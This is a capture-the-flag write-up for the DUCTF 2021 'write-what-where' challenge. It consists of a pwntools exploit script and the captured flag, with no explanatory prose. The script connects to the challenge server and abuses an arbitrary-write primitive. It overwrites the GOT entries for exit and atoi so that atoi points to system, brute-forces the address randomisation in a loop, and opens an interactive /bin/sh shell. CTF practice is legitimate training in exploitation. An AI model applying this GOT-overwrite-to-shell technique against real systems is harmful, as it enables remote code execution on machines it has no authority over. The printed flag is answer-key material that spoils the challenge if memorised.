# write-what-where

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31920 write-what-where
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write-what-where')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31920)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

print(hex(libc.sym['system']))
print(hex(libc.sym['atoi']))

while True:
    io = start()

    io.sendafter(b'what?', p32(exe.sym['main']))
    io.sendafter(b'where?', str(exe.got['exit']).encode())

    overwrite = p16(libc.sym['system'] & 0xffff).rjust(4, b'\x00')
    print(overwrite)
    io.sendafter(b'what?', overwrite)
    io.sendafter(b'where?', str(exe.got['atoi'] - 2).encode())

    io.sendafter(b'what?', b'aaaa')
    io.sendafter(b'where?', b'/bin/sh\x00')

    io.clean(1)

    if io.connected('read'):
        break
    else:
        io.close()

io.interactive()
```

## Flag

`DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}`

